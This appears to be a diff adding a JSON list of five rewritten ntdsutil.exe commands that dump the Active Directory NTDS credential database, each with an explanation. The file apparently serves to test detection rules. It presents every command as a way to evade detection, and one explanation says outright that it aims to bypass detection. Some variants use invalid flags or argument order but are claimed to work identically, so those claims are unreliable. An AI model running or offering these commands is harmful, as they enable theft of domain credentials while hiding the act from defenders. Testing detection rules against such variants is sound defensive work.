@@ -1,0 +1,24 @@
+```json
+[
+  {
+    "output": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\\\Windows\\\\Temp\\\\ntds_T1003\" q q",
+    "explanation": "This command uses insertion of quotes and escaping to bypass detection while maintaining the same functionality as the original command. The arguments are wrapped in quotes and spaces are added for obfuscation."
+  },
+  {
+    "output": "ntdsutil.exe ac i ntds ifm create full C:\\\\Windows\\\\Temp\\\\ntds_T1003 q q",
+    "explanation": "This command removes unnecessary quotes and spaces to test if the detection rule is sensitive to formatting. The command is functionally identical but simplified."
+  },
+  {
+    "output": "ntdsutil.exe -ac -i -ntds -ifm -create -full C:\\\\Windows\\\\Temp\\\\ntds_T1003 -q -q",
+    "explanation": "This command uses substitution of short flags (-ac, -i, -ntds) instead of the full command strings. This tests if the detection rule is sensitive to the use of short flags."
+  },
+  {
+    "output": "ntdsutil.exe \"create full C:\\\\Windows\\\\Temp\\\\ntds_T1003\" \"ac i ntds\" \"ifm\" q q",
+    "explanation": "This command reorders the arguments to test if the detection rule is sensitive to the order of command-line parameters."
+  },
+  {
+    "output": "ntdsutil.exe `\"ac i ntds`\" `\"ifm`\" `\"create full C:\\\\Windows\\\\Temp\\\\ntds_T1003`\" q q",
+    "explanation": "This command uses escape characters and alternative quoting to test if the detection rule is sensitive to the use of escape characters in the command line."
+  }
+]
+```
